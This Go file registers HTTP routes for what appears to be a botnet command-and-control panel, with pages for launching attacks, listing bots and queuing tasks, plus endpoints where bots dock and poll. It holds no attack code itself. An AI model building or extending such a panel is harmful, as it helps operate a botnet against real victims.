package main

func initializeRoutes() { // //is finished task
	router.GET("/", show404Page) //
	router.GET("/attack.log", showAttackLogPage) //
	router.GET("/attack.new", showNewAttackPage) //
	router.GET("/bot.list", showBotListPage) //
	router.GET("/dashboard", showDashboardPage) //
	router.GET("/login", showLoginPage) //
	router.GET("/logout", performLogout) //
	router.GET("/setting", showSettingPage) //
	router.GET("/task.log", showTaskLogPage) //
	router.GET("/task.new", showNewTaskPage) //

	router.POST("/attack.new", createAttack) //
	router.POST("/login", performLogin) //
	router.POST("/setting", setVariables) //
	router.POST("/task.new", createTask) //

	router.GET("/interval", respInterval) //
	router.POST("/docking", botDock) //
}